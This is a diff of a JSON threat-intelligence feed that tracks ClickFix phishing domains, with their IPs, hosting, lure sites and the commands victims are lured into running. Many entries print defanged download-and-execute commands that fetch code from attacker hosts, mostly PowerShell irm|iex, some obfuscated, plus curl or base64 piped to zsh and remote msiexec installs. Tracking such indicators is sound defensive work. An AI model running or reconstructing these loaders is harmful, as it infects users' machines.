@@ -12883,15 +12883,16 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
+    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
+    "lepafonso.bz",
     "github.pw",
     "trustchecknes.com",
-    "lepafonso.bz",
+    "j7tracker.gb.net",
     "nexguard.pro"
    ],
    "lure_from": [
@@ -25896,10 +25897,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex"
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
+    "echo '[encoded]' | base64 -d | zsh"
    ],
    "connects_to": [
-    "j7tracker.gb.net"
+    "j7tracker.gb.net",
+    "entitlementcheck.pro"
    ],
    "lure_from": [
     "interseq.at"
@@ -68158,6 +68161,13 @@
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
+    {
+     "ip": "172.64.80.1",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-23",
+     "last_seen": "2026-11-23"
+    },
     {
      "ip": "172.67.200.45",
      "asn": "AS13335",
@@ -116480,7 +116490,7 @@
    "last_seen": "2026-11-23",
    "last_online": "2026-11-23",
    "offline_since": null,
-   "url": "https://futuredesignpainting.com/",
+   "url": "https://futuredesignpainting.com/roof-gutter-cleaning/",
    "brand": null,
    "product": null,
    "hosting": "Cloudflare (proxied)",
@@ -116867,7 +116877,8 @@
     "lepafonso.bz"
    ],
    "lure_from": [
-    "interseq.at"
+    "interseq.at",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -117656,6 +117667,56 @@
    ],
    "connects_to": [],
    "lure_from": []
+  },
+  {
+   "indicator": "gain-access.to",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-23",
+   "last_seen": "2026-11-23",
+   "last_online": "2026-11-23",
+   "offline_since": null,
+   "url": "https://gain-access.to/",
+   "brand": null,
+   "product": null,
+   "hosting": "AS Digital Hosting Provider LLC",
+   "dns": "share-dns.com",
+   "ip": "153.80.249.87",
+   "asn": "AS209207",
+   "org": "DHOST-AS Digital Hosting Provider LLC, RU",
+   "country": "NL",
+   "ips": [
+    {
+     "ip": "153.80.249.87",
+     "asn": "AS209207",
+     "org": "DHOST-AS Digital Hosting Provider LLC, RU",
+     "first_seen": "2026-11-23",
+     "last_seen": "2026-11-23"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "gain-access.to",
+     "status": "online",
+     "first_seen": "2026-11-23",
+     "last_seen": "2026-11-23"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "powershell -WindowStyle Hidden -Command \"$d=[xml](New-Object Net.WebClient).DownloadString('hxxps[:]//ke4asholdings[.]com/4/config.xml');Invoke-Expression $d.config.command.InnerText\";"
+   ],
+   "connects_to": [
+    "ke4asholdings.com"
+   ],
+   "lure_from": [
+    "cloudflare-eth.com"
+   ]
   },
   {
    "indicator": "galabau-savucu.de",
@@ -144022,9 +144083,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//farmalogia[.]net/yi77c64qpv/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
     "echo '[encoded]' | base64 -d | zsh"
    ],
    "connects_to": [
+    "farmalogia.net",
     "entitlementcheck.pro"
    ],
    "lure_from": [
@@ -144072,10 +144135,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex"
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
+    "echo '[encoded]' | base64 -d | zsh"
    ],
    "connects_to": [
-    "j7tracker.gb.net"
+    "j7tracker.gb.net",
+    "entitlementcheck.pro"
    ],
    "lure_from": [
     "interseq.at"
@@ -159177,9 +159242,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//farmalogia[.]net/yi77c64qpv/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
     "echo '[encoded]' | base64 -d | zsh"
    ],
    "connects_to": [
+    "farmalogia.net",
     "entitlementcheck.pro"
    ],
    "lure_from": [
@@ -159227,9 +159294,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//farmalogia[.]net/yi77c64qpv/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
     "echo '[encoded]' | base64 -d | zsh"
    ],
    "connects_to": [
+    "farmalogia.net",
     "entitlementcheck.pro"
    ],
    "lure_from": [
@@ -159277,9 +159346,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//farmalogia[.]net/yi77c64qpv/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
     "echo '[encoded]' | base64 -d | zsh"
    ],
    "connects_to": [
+    "farmalogia.net",
     "entitlementcheck.pro"
    ],
    "lure_from": [
@@ -183592,6 +183663,7 @@
     "trek-72.com",
     "t-trustrest.com",
     "trustchecknes.com",
+    "farmalogia.net",
     "j7tracker.gb.net",
     "nexguard.pro",
     "t-trustresnew.com"
@@ -187929,10 +188001,10 @@
     "nikogdatakonebilo.cc",
     "biboiboboorl.org",
     "mango-oyster.cfd",
+    "hyyuuuuikooonyaa.org",
     "efreitorher.org",
     "yaebalciganovvjopu.org",
-    "yaponovosh.org",
-    "ciganshina.org"
+    "yaponovosh.org"
    ]
   },
   {
@@ -197964,222 +198036,6 @@
    "lure_from": []
   },
   {
-   "indicator": "mybluehost.me",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-23",
-   "last_seen": "2026-11-23",
-   "last_online": "2026-11-23",
-   "offline_since": null,
-   "url": "http://website-bf5bcbea.okf.nuu.mybluehost.me/",
-   "brand": null,
-   "product": null,
-   "hosting": "Oracle Cloud",
-   "dns": "Newfold",
-   "ip": "162.241.244.133",
-   "asn": "AS31898",
-   "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
-   "country": "US",
-   "ips": [
-    {
-     "ip": "162.241.244.133",
-     "asn": "AS31898",
-     "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
-     "first_seen": "2026-11-23",
-     "last_seen": "2026-11-23"
-    },
-    {
-     "ip": "173.254.29.122",
-     "asn": "AS31898",
-     "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
-     "first_seen": "2026-11-21",
-     "last_seen": "2026-11-22"
-    },
-    {
-     "ip": "162.241.219.167",
-     "asn": "AS31898",
-     "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-19"
-    },
-    {
-     "ip": "50.87.184.131",
-     "asn": "AS46606",
-     "org": "UNIFIEDLAYER-AS-1 - Unified Layer, US",
-     "first_seen": "2026-11-17",
-     "last_seen": "2026-11-17"
-    },
-    {
-     "ip": "162.241.253.222",
-     "asn": "AS46606",
-     "org": "UNIFIEDLAYER-AS-1 - Unified Layer, US",
-     "first_seen": "2026-11-15",
-     "last_seen": "2026-11-17"
-    },
-    {
-     "ip": "162.241.219.134",
-     "asn": "AS31898",
-     "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
-     "first_seen": "2026-10-25",
-     "last_seen": "2026-10-26"
-    },
-    {
-     "ip": "162.241.244.144",
-     "asn": "AS31898",
-     "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
-     "first_seen": "2026-10-23",
-     "last_seen": "2026-10-25"
-    },
-    {
-     "ip": "162.241.225.93",
-     "asn": "AS31898",
-     "org": "Oracle Corporation",
-     "first_seen": "2026-10-23",
-     "last_seen": "2026-10-25"
-    },
-    {
-     "ip": "162.241.24.56",
-     "asn": "AS31898",
-     "org": "Oracle Corporation",
-     "first_seen": "2026-10-23",
-     "last_seen": "2026-10-23"
-    },
-    {
-     "ip": "50.116.70.153",
-     "asn": "AS31898",
-     "org": "Oracle Corporation",
-     "first_seen": "2026-10-23",
-     "last_seen": "2026-10-23"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "acd.col.mybluehost.me",
-     "status": "online",
-     "first_seen": "2026-10-23",
-     "last_seen": "2026-10-23"
-    },
-    {
-     "host": "ekx.mya.mybluehost.me",
-     "status": "online",
-     "first_seen": "2026-10-25",
-     "last_seen": "2026-10-26"
-    },
-    {
-     "host": "foh.syi.mybluehost.me",
-     "status": "online",
-     "first_seen": "2026-11-17",
-     "last_seen": "2026-11-17"
-    },
-    {
-     "host": "iwx.dvf.mybluehost.me",
-     "status": "online",
-     "first_seen": "2026-11-02",
-     "last_seen": "2026-11-04"
-    },
-    {
-     "host": "mail.acd.col.mybluehost.me",
-     "status": "online",
-     "first_seen": "2026-10-23",
-     "last_seen": "2026-10-23"
-    },
-    {
-     "host": "mail.ekx.mya.mybluehost.me",
-     "status": "online",
-     "first_seen": "2026-10-25",
-     "last_seen": "2026-10-26"
-    },
-    {
-     "host": "mail.iwx.dvf.mybluehost.me",
-     "status": "online",
-     "first_seen": "2026-11-04",
-     "last_seen": "2026-11-19"
-    },
-    {
-     "host": "mail.rgm.mqz.mybluehost.me",
-     "status": "online",
-     "first_seen": "2026-10-23",
-     "last_seen": "2026-10-25"
-    },
-    {
-     "host": "mail.rvh.aio.mybluehost.me",
-     "status": "online",
-     "first_seen": "2026-11-15",
-     "last_seen": "2026-11-17"
-    },
-    {
-     "host": "website-256db78e.sct.lof.mybluehost.me",
-     "status": "offline",
-     "first_seen": "2026-10-23",
-     "last_seen": "2026-10-25"
-    },
-    {
-     "host": "website-bf5bcbea.okf.nuu.mybluehost.me",
-     "status": "online",
-     "first_seen": "2026-11-23",
-     "last_seen": "2026-11-23"
-    },
-    {
-     "host": "www.acd.col.mybluehost.me",
-     "status": "online",
-     "first_seen": "2026-10-23",
-     "last_seen": "2026-10-23"
-    },
-    {
-     "host": "www.airconditioncapetown-co-za.nzy.tpo.mybluehost.me",
-     "status": "online",
-     "first_seen": "2026-10-23",
-     "last_seen": "2026-10-23"
-    },
-    {
-     "host": "www.ekx.mya.mybluehost.me",
-     "status": "online",
-     "first_seen": "2026-10-25",
-     "last_seen": "2026-10-26"
-    },
-    {
-     "host": "www.iwx.dvf.mybluehost.me",
-     "status": "online",
-     "first_seen": "2026-11-03",
-     "last_seen": "2026-11-17"
-    },
-    {
-     "host": "yzj.bgf.mybluehost.me",
-     "status": "online",
-     "first_seen": "2026-11-21",
-     "last_seen": "2026-11-22"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
-    "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-[id]/-/raw/main/01a1e287-8de7-700c-802a-[id] | IEX"
-   ],
-   "connects_to": [
-    "t-trustrest.com",
-    "xorados.com",
-    "groverudder12.com",
-    "id-verfied.boats"
-   ],
-   "lure_from": [
-    "authshipup.net",
-    "runtimerailbit.com",
-    "servicestatlab.com",
-    "makeverizyjar.info",
-    "interseq.at",
-    "jscdncloude.beer",
-    "ncheck-brows.beer",
-    "codes.browse-cdn.beer",
-    "browse-cloud.codes"
-   ]
-  },
-  {
    "indicator": "myboostup.io",
    "type": "domain",
    "category": "clickfix",
@@ -198456,7 +198312,7 @@
    "last_seen": "2026-11-23",
    "last_online": "2026-11-23",
    "offline_since": null,
-   "url": "https://585697.us20.myftpupload.com/",
+   "url": "https://147816.us6.myftpupload.com/",
    "brand": null,
    "product": null,
    "hosting": "Cloudflare (proxied)",
@@ -206881,7 +206737,8 @@
    "lure_from": [
     "codes.caffe-img.com",
     "codes.browse-cdn.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -218240,7 +218097,7 @@
    "last_seen": "2026-11-23",
    "last_online": "2026-11-23",
    "offline_since": "2026-11-23",
-   "url": "https://plshousing.org/wp-content/mu-plugins/vendor/wpex/godaddy-launch/includes/Dependencies/GoDadd",
+   "url": "https://plshousing.org/2026/09/11/[redacted]/",
    "brand": null,
    "product": null,
    "hosting": "Cloudflare (proxied)",
@@ -242747,11 +242604,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "MSIExEC.exe /package http:\\/eofiwc.cfd\\wqgmqek /Q S1=\"𝗦𝗖​𝝜𝝚𝝡​𝝖 𝝩​𝝖𝝗​𝗟𝝚 𝝦​𝗥𝝚​𝗦𝗦 𝝚𝝢​𝝩𝝚​𝗥 \"",
     "mSIEXEc.exe /i http:\\/cf.web-restapi.cfd\\c25jdwlezyhtcq /Q S1=\" \"",
-    "MsIexEC.exe /package http:/\\www.api-point-cf.cfd\\bv48w2t469i70k /Q S1=\" \"",
-    "irm 'id-verfied.boats/[id]'|iex;"
+    "MsIexEC.exe /package http:/\\www.api-point-cf.cfd\\bv48w2t469i70k /Q S1=\" \""
    ],
    "connects_to": [
+    "eofiwc.cfd",
     "cf.web-restapi.cfd",
     "www.api-point-cf.cfd",
     "id-verfied.boats"
@@ -242760,7 +242618,8 @@
     "ncheck-brows.beer",
     "browse-cloud.codes",
     "codes.caffe-img.com",
-    "codes.browse-cdn.beer"
+    "codes.browse-cdn.beer",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -251222,7 +251081,8 @@
     "ncheck-brows.beer",
     "browse-cloud.codes",
     "codes.caffe-img.com",
-    "codes.browse-cdn.beer"
+    "codes.browse-cdn.beer",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -259934,9 +259794,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//farmalogia[.]net/saykatproliv1/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
+    "(irm 'hxxps[:]//holodeo[.]net/saykatproliv1/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex"
    ],
    "connects_to": [
+    "farmalogia.net",
+    "holodeo.net",
+    "j7tracker.gb.net",
     "lepafonso.bz"
    ],
    "lure_from": [
@@ -269332,7 +269197,8 @@
     "ncheck-brows.beer",
     "browse-cloud.codes",
     "codes.caffe-img.com",
-    "codes.browse-cdn.beer"
+    "codes.browse-cdn.beer",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -314383,10 +314249,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "(irm 'hxxps[:]//farmalogia[.]net/saykatproliv1/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex"
    ],
    "connects_to": [
-    "hagosuro.lc"
+    "hagosuro.lc",
+    "farmalogia.net",
+    "j7tracker.gb.net"
    ],
    "lure_from": [
     "interseq.at"
